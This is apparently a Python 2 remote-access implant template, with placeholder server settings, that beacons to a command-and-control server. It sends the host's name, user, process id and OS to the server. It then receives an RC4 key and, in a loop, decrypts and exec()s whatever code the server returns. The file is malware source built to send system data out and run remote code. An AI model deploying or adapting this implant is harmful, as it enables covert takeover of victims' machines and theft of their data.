import urllib2, json, getpass, os, platform, socket, sys, time


external_address = "EXTERNAL_ADDRESS"
port = "PORT"
protocol = "PROTOCOL"
beacon_uri = "BEACON_URI"
update_uri = "UPDATE_URI"
user_agent = "USER_AGENT"
sleep_interval = "SLEEP_INTERVAL"
beacon_url = protocol + "://" + external_address + "/" + beacon_uri
update_url = protocol + "://" + external_address + "/" + update_uri


def crypt(data, key):
    S = range(256); j = 0; out = []

    for i in range(256):
        j = (j + S[i] + ord(key[i % len(key)])) % 256
        S[i] , S[j] = S[j] , S[i]

    i = j = 0

    for char in data:
        i = ( i + 1 ) % 256
        j = ( j + S[i] ) % 256
        S[i] , S[j] = S[j] , S[i]
        out.append(chr(ord(char) ^ S[(S[i] + S[j]) % 256]))

    return "".join(out)


def get_system_info():
    hostname = socket.gethostname()
    current_user = getpass.getuser()
    process_id = os.getpid()

    if "Darwin" in platform.system():
        operating_system = "Mac OS X " + platform.mac_ver()[0]
    else:
        operating_system = platform.linux_distribution()[0] + " " + platform.linux_distribution()[1]

    return (hostname, current_user, process_id, operating_system)


def beacon(hostname, current_user, process_id, operating_system):
    post_data = {
        "hostname": hostname,
        "current_user": current_user,
        "process_id": process_id,
        "os": operating_system
    }

    request = urllib2.Request(beacon_url)
    request.add_header("Content-Type", "application/json")
    request.add_header("User-Agent", user_agent)
    f = urllib2.urlopen(request, json.dumps(post_data))
    response = f.read()
    return response


if __name__ == "__main__":
    counter = 0

    while True:
        hostname, current_user, process_id, operating_system = get_system_info()

        # If initial beacon
        if counter is 0:
            print "new host"

            # Gets encryption key
            key = beacon(hostname, current_user, process_id, operating_system)
            counter += 1

        # Else recurring beacon
        else:
            print "old host"
            #print beacon(hostname, current_user, process_id, operating_system)
            exec(crypt(beacon(hostname, current_user, process_id, operating_system), key))

            # statement above will need changed to exec()
            #print k

        time.sleep(sleep_interval)
